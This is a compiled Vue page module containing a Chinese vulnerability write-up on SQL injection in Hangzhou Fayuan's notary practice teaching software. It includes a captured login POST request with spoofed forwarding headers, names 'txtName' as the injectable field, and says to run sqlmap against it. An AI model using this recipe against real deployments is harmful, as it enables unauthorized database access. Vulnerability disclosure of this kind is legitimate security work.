import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const d={},l=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>杭州法源软件 公证实务教学软件 存在SQL注入漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>杭州法源软件 公证实务教学软件
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><p>FOFA暂时未收录任何网站</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101856282.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>登录抓取请求包</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /JusNotary/ HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Length: 219
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: ASP.NET_SessionId=54zwf05sd1g4zyfpiuxxdmuc
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

__EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=%2FwEPDwUKMTE5NTI5NDc1Ng8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBZGTTkYMK0k4DlIElq0ua0zvxEhpFH8rCzVrUscEhlVc9pw%3D%3D&amp;__VIEWSTATEGENERATOR=1B0004A3&amp;txtName=123&amp;txtPwd=123&amp;btnSubmit=+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中注入的参数为 POST数据中的 <strong>txtName</strong> 参数, 保存为文件使用 Sqlmap跑一下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101856878.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,13),s=[l];function r(t,c){return i(),a("div",null,s)}const m=e(d,[["render",r],["__file","杭州法源软件 公证实务教学软件 SQL注入漏洞.html.vue"]]);export{m as default};
